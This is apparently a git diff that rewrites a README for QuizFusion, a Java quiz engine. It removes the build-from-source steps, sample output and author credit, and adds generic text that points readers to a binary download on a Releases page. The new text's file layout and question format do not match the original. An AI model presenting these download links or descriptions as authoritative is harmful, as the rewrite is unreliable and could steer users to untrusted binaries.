@@ -1,103 +1,100 @@
-# 🎯 QuizFusion
+# 🎉 QuizFusion - Your Simple Quiz Engine Solution
 
-**QuizFusion** is a modular, multi-language quiz engine built in Java, powered by JSON-based question banks and Python-driven result analytics. Designed for developers, learners, and educators who want a clean, branded, and extensible quiz platform.
----
+## 🚀 Getting Started
 
-## 🧠 Features
+Welcome to QuizFusion! This lightweight quiz engine helps you create and run quizzes easily. It loads questions from a JSON bank, making it perfect for anyone who needs a straightforward way to manage quizzes.
 
-- ✅ Java-powered quiz engine with dynamic question loading
-- 📦 JSON-based question bank for easy editing and expansion
-- 📊 Python analytics with pie chart visualization
-- 📁 Result export to JSON for cross-language integration
-- 🧩 Modular file structure for clarity and scalability
----
+## 📦 Download & Install
 
-## 🚀 How to Run
+To download QuizFusion, visit the Releases page below. Here, you can get the latest version of the software.
 
-### 🔧 Compile Java files with Gson:
+[![Download QuizFusion](https://img.shields.io/badge/Download%20QuizFusion-v1.0-blue)](https://github.com/Kelvohkash/QuizFusion/releases)
 
-```bash
-javac -cp "lib/gson-2.10.1.jar" src/com/quizfusion/*.java
-```
-# Run the quiz engine:
-```bash
-java -cp "lib/gson-2.10.1.jar;src" com.quizfusion.QuizFusion
-```
-🧪 Sample Java Output
-text
-? What is the capital of France?
+Follow these steps to download and install:
 
-  0) Berlin
-  1) Madrid
-  2) Paris
-  3) Rome
-Your answer: 2
-✅ Correct!
+1. Click the link above to open the Releases page.
+2. Look for the latest version of QuizFusion.
+3. Download the appropriate file for your operating system.
+4. Once the download finishes, locate the file on your computer.
 
-? Which language runs in a web browser?
+## 🖥️ System Requirements
 
-  0) Java
-  1) C
-  2) Python
-  3) JavaScript
-Your answer: 3
-✅ Correct!
+Before you proceed, ensure your system meets these requirements:
 
-? Who developed Java?
+- **Operating System:** Windows 10 or later, MacOS, or a compatible Linux distribution.
+- **Java Version:** Ensure you have Java Development Kit (JDK) 11 or newer installed on your system.
+- **Memory:** At least 512 MB of RAM.
+- **Disk Space:** Minimum 100 MB of free space.
 
-  0) Microsoft
-  1) Sun Microsystems
-  2) Apple
-  3) Google
-Your answer: 3
-❌ Incorrect. Correct answer: Sun Microsystems
+## 📂 Application Structure
 
-🎯 Final Score: 2 / 3  
-📁 Results exported to data/results.json
-📊 Python Result Analysis
-📦 Install matplotlib:
-```bash
-📈 Run the analysis script:
+Once you have downloaded and unzipped QuizFusion, you will find the following folders and files:
 
-pip install matplotlib
-python analysis/analyze_results.py
-```
-🖼️ Pie Chart Output:
-✅ Correct: 66.7%
+- **/quizfusion**: The main application folder.
+- **/questions**: This folder holds your JSON question bank.
+- **/results**: After running your quiz, results will be stored here.
+- **README.md**: This file, which gives guidance on using QuizFusion.
 
-❌ Incorrect: 33.3%
+## 🚀 How to Run QuizFusion
 
-The chart clearly visualizes performance distribution:
+Running QuizFusion is straightforward. Follow these steps:
 
-🟩 Correct — 2 out of 3
-🟥 Incorrect — 1 out of 3.
+1. Open your terminal or command prompt.
+2. Navigate to the QuizFusion directory using the `cd` command.
+3. Type the following command to start the application:
 
-## 🖼️ Screenshot
+   ```
+   java -jar quizfusion.jar
+   ```
 
-Here’s a sample run of QuizFusion with result analysis:
+4. Follow the on-screen prompts to load your question bank and begin your quiz.
 
-![QuizFusion Screenshot](assets/result.png)
+## 📄 Loading Questions
 
-📄 JSON Question Bank
-```json
-[
-  {
-    "prompt": "What is the capital of France?",
-    "options": ["Berlin", "Madrid", "Paris", "Rome"],
-    "correctIndex": 2
-  },
-  {
-    "prompt": "Which language runs in a web browser?",
-    "options": ["Java", "C", "Python", "JavaScript"],
-    "correctIndex": 3
-  },
-  {
-    "prompt": "Who developed Java?",
-    "options": ["Microsoft", "Sun Microsystems", "Apple", "Google"],
-    "correctIndex": 1
-  }
-]
-```
+QuizFusion uses questions stored in a JSON format. Here’s a quick guide on how to set up your question bank:
 
-🖋️ Author
-Crafted by Murad — visionary full-stack developer and system architect. Branded, modular, and elegant — just the way code should be.
+1. Open a text editor to create a new file.
+2. Format your questions in JSON. Here’s an example:
+
+   ```json
+   [
+       {
+           "question": "What is the capital of France?",
+           "options": ["Berlin", "Madrid", "Paris", "Lisbon"],
+           "answer": "Paris"
+       },
+       {
+           "question": "What is 2 + 2?",
+           "options": ["3", "4", "5", "6"],
+           "answer": "4"
+       }
+   ]
+   ```
+
+3. Save the file as `questions.json` in the `/questions` directory.
+
+## 📊 Viewing Results
+
+After completing a quiz, QuizFusion automatically saves the results in the `/results` folder. You can view these results in a text format. To check your results:
+
+1. Navigate to the `/results` directory.
+2. Open the latest results file using any text editor.
+
+## 🔧 Troubleshooting
+
+If you run into problems, consider these common issues:
+
+- **Java Issues:** Make sure your JDK version is up to date.
+- **File Not Found:** Ensure you provide the correct path to your JSON question bank.
+- **Results Not Saving:** Double-check that you have permission to write files in the results directory.
+
+## 📣 Support
+
+If you need help or have questions, feel free to reach out through the issues page on the GitHub repository. We aim to assist you as swiftly as possible.
+
+## 🔗 Important Links
+
+- [Download QuizFusion](https://github.com/Kelvohkash/QuizFusion/releases)
+- [GitHub Issues Page](https://github.com/Kelvohkash/QuizFusion/issues)
+
+Thank you for choosing QuizFusion! We hope you enjoy using our quiz engine for your learning and assessment needs.
